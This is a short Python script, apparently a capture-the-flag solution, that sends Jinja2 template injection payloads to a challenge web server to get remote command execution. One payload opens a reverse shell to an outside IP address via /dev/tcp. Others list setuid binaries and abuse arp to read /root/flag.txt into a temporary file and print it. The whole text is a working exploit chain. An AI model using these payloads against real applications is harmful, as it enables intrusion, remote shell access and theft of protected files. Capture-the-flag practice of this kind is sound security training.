from urllib.request import urlopen
from urllib.parse import urlencode
url = "http://challenge.hackynov.fr:25000/?" + urlencode({"name": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('sh -i >& /dev/tcp/3.67.112.102/15772 0>&1').read() }}"})
print(url)
print(urlopen(url).read())
url = "http://challenge.hackynov.fr:25000/?" + urlencode({"name": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('find . -perm /6000').read() }}"})
print(url)
print(urlopen(url).read())
url = "http://challenge.hackynov.fr:25000/?" + urlencode({"name": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('arp -v -f /root/flag.txt 2> /tmp/test').read() }}"})
print(url)
print(urlopen(url).read())
url = "http://challenge.hackynov.fr:25000/?" + urlencode({"name": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /tmp/test').read() }}"})
print(url)
print(urlopen(url).read())